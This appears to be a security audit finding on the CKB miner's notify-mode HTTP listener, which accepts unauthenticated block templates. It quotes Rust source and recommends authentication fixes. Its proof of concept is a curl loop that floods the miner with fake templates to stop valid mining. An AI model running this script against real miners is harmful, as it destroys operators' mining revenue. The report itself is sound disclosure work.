### Title
Unauthenticated Miner Notify HTTP Endpoint Allows Any Caller to Inject Fake Block Templates - (`File: miner/src/client.rs`)

### Summary

When the CKB miner is configured in "notify mode," it opens an HTTP server to receive block template push notifications from the CKB node. This HTTP server performs **no authentication or source verification** on incoming requests. Any attacker who can reach the miner's listen address can POST a crafted `BlockTemplate` JSON payload, causing the miner to abandon its current valid work and mine on an attacker-controlled (invalid) template, wasting all hashpower and preventing valid block submission indefinitely.

### Finding Description

The CKB miner supports two modes of operation: poll mode (periodic RPC calls to `get_block_template`) and notify mode (the CKB node pushes new templates via HTTP POST to a configured URL). When notify mode is enabled via `config.listen`, the miner starts an HTTP server in `listen_block_template_notify`:

```rust
// miner/src/client.rs:234-271
async fn listen_block_template_notify(&self, addr: SocketAddr) {
    let listener = TcpListener::bind(addr).await.unwrap();
    ...
    loop {
        let client = self.clone();
        let handle = service_fn(move |req| handle(client.clone(), req));
        tokio::select! {
            conn = listener.accept() => { ... }
        }
    }
}
```

Every accepted connection is dispatched to the `handle` function:

```rust
// miner/src/client.rs:358-369
async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let body = BodyExt::collect(req).await?.aggregate();

    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);
    }

    Ok(Response::new(Empty::new()))
}
```

There is **no check on the source IP, no shared secret, no HMAC, no token** — the handler unconditionally deserializes the body as a `BlockTemplate` and calls `update_block_template`. The `update_block_template` function then replaces the miner's active work and sends the new (attacker-controlled) `Work` to all mining worker threads:

```rust
// miner/src/client.rs:293-312
fn update_block_template(&self, block_template: BlockTemplate) {
    let work_id = block_template.work_id.into();
    let updated = |id| {
        if id != work_id || id == 0 { Some(work_id) } else { None }
    };
    if self.current_work_id
        .fetch_update(Ordering::SeqCst, Ordering::SeqCst, updated)
        .is_ok()
    {
        let work: Work = block_template.into();
        if let Err(e) = self.new_work_tx.send(Works::New(work)) { ... }
    }
}
```

The attacker can continuously send templates with incrementing `work_id` values (since the update guard only blocks same-ID re-injection) to keep the miner permanently redirected to invalid work.

The CKB node's block assembler sends templates to the miner via plain HTTP POST with no authentication header either:

```rust
// tx-pool/src/block_assembler/mod.rs:691-695
if let Ok(req) = Request::builder()
    .method(Method::POST)
    .uri(url.as_ref())
    .header("content-type", "application/json")
    .body(Full::new(template_json.to_owned().into()))
```

This confirms the protocol is unauthenticated by design, making the miner's listener trivially spoofable.

### Impact Explanation

**Impact: High** — An attacker who can reach the miner's HTTP listen port can:

1. Inject a crafted `BlockTemplate` with an arbitrary `parent_hash`, `transactions_root`, or `compact_target`, causing all mining workers to compute PoW on an invalid block.
2. Continuously rotate fake templates (incrementing `work_id`) to prevent the miner from ever reverting to the legitimate template.
3. The miner will never submit a valid block to the CKB node, resulting in complete loss of mining rewards for the operator.
4. Even if the miner solves the fake PoW puzzle and calls `submit_block`, the CKB node rejects the block (invalid header, wrong parent, etc.), and the miner receives `Works::FailSubmit` — but the attacker can immediately inject another fake template before the miner recovers.

This is an unauthorized state change (mining target hijacking) that causes permanent economic harm to the mining operator.

### Likelihood Explanation

**Likelihood: Medium** — The notify mode is an explicitly documented and supported feature (`listen = "127.0.0.1:8888"` in `ckb-miner.toml`). The attack requires:

1. The miner to be configured with `listen` set (not the default, but a documented production feature).
2. The attacker to reach the miner's HTTP port. If the miner and node run on different machines (common in pool mining setups), the listen address may be `0.0.0.0:PORT`, making it network-reachable. Even on localhost, any co-located process (e.g., a compromised dependency or another service) can exploit this.

No privileged access, no keys, and no cryptographic break are required.

### Recommendation

Add source authentication to the miner's notify HTTP endpoint. Options include:

1. **Shared secret / Bearer token**: The CKB node includes a configurable secret in the `Authorization` header when posting templates; the miner rejects requests missing or with a wrong token.
2. **IP allowlist**: The miner's HTTP server only accepts connections from the configured CKB node's IP address.
3. **Bind to loopback only and enforce**: Document and enforce that the listen address must be `127.0.0.1` (loopback), and add a startup warning or hard rejection if a non-loopback address is configured without an explicit override flag.

The `parse_authorization` function already exists in `miner/src/client.rs` for outbound RPC calls — a symmetric mechanism should be applied to the inbound notify server.

### Proof of Concept

**Precondition:** Miner is configured with `listen = "0.0.0.0:8888"` (or any reachable address) in `ckb-miner.toml`.

**Attack steps:**

```bash
# Attacker continuously injects fake block templates with incrementing work_id
WORK_ID=9999
while true; do
  curl -s -X POST http://<miner-ip>:8888/ \
    -H "content-type: application/json" \
    -d "{
      \"version\": \"0x0\",
      \"compact_target\": \"0x207fffff\",
      \"current_time\": \"0x$(date +%s)000\",
      \"number\": \"0x1\",
      \"epoch\": \"0x1\",
      \"parent_hash\": \"0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef\",
      \"cycles_limit\": \"0xd09dc300\",
      \"bytes_limit\": \"0x91c08\",
      \"uncles_count_limit\": \"0x2\",
      \"uncles\": [],
      \"transactions\": [],
      \"proposals\": [],
      \"cellbase\": {\"cycles\": null, \"data\": {\"cell_deps\": [], \"header_deps\": [], \"inputs\": [], \"outputs\": [], \"outputs_data\": [], \"version\": \"0x0\", \"witnesses\": []}, \"hash\": \"0x0000000000000000000000000000000000000000000000000000000000000000\"},
      \"work_id\": \"0x$WORK_ID\",
      \"dao\": \"0x0000000000000000000000000000000000000000000000000000000000000000\"
    }"
  WORK_ID=$((WORK_ID + 1))
  sleep 0.5
done
```

**Expected result:** The miner's workers continuously receive new `Works::New(fake_work)` items, mine on the invalid `parent_hash`, and never submit a valid block to the CKB node. The legitimate node-pushed templates are overwritten on each iteration. Mining revenue drops to zero. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** miner/src/client.rs (L234-271)
```rust
    async fn listen_block_template_notify(&self, addr: SocketAddr) {
        let listener = TcpListener::bind(addr).await.unwrap();
        let server = auto::Builder::new(TokioExecutor::new());
        let graceful = GracefulShutdown::new();
        let stop_rx: CancellationToken = new_tokio_exit_rx();

        loop {
            let client = self.clone();
            let handle = service_fn(move |req| handle(client.clone(), req));
            tokio::select! {
                conn = listener.accept() => {
                    let (stream, _) = match conn {
                        Ok(conn) => conn,
                        Err(e) => {
                            info!("accept error: {}", e);
                            tokio::time::sleep(std::time::Duration::from_secs(1)).await;
                            continue;
                        }
                    };
                    let stream = hyper_util::rt::TokioIo::new(Box::pin(stream));
                    let conn = server.serve_connection_with_upgrades(stream, handle);

                    let conn = graceful.watch(conn.into_owned());
                    tokio::spawn(async move {
                        if let Err(err) = conn.await {
                            info!("connection error: {}", err);
                        }
                    });
                },
                _ = stop_rx.cancelled() => {
                    info!("Miner client received exit signal. Exit now");
                    break;
                }
            }
        }
        drop(listener);
        graceful.shutdown().await;
    }
```

**File:** miner/src/client.rs (L293-312)
```rust
    fn update_block_template(&self, block_template: BlockTemplate) {
        let work_id = block_template.work_id.into();
        let updated = |id| {
            if id != work_id || id == 0 {
                Some(work_id)
            } else {
                None
            }
        };
        if self
            .current_work_id
            .fetch_update(Ordering::SeqCst, Ordering::SeqCst, updated)
            .is_ok()
        {
            let work: Work = block_template.into();
            if let Err(e) = self.new_work_tx.send(Works::New(work)) {
                error!("notify_new_block error: {:?}", e);
            }
        }
    }
```

**File:** miner/src/client.rs (L358-369)
```rust
async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let body = BodyExt::collect(req).await?.aggregate();

    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);
    }

    Ok(Response::new(Empty::new()))
}
```

**File:** tx-pool/src/block_assembler/mod.rs (L690-711)
```rust
            for url in &self.config.notify {
                if let Ok(req) = Request::builder()
                    .method(Method::POST)
                    .uri(url.as_ref())
                    .header("content-type", "application/json")
                    .body(Full::new(template_json.to_owned().into()))
                {
                    let client = Arc::clone(&self.poster);
                    let url = url.to_owned();
                    tokio::spawn(async move {
                        let _resp =
                            timeout(notify_timeout, client.request(req))
                                .await
                                .map_err(|_| {
                                    ckb_logger::warn!(
                                        "block assembler notifying {} timed out",
                                        url
                                    );
                                });
                    });
                }
            }
```

**File:** util/app-config/src/configs/miner.rs (L19-30)
```rust
pub struct ClientConfig {
    /// CKB node RPC endpoint.
    pub rpc_url: String,
    /// The poll interval in seconds to get work from the CKB node.
    pub poll_interval: u64,
    /// By default, miner submits a block and continues to get the next work.
    ///
    /// When this is enabled, miner will block until the submission RPC returns.
    pub block_on_submit: bool,
    /// listen block_template notify instead of loop poll
    pub listen: Option<SocketAddr>,
}
```
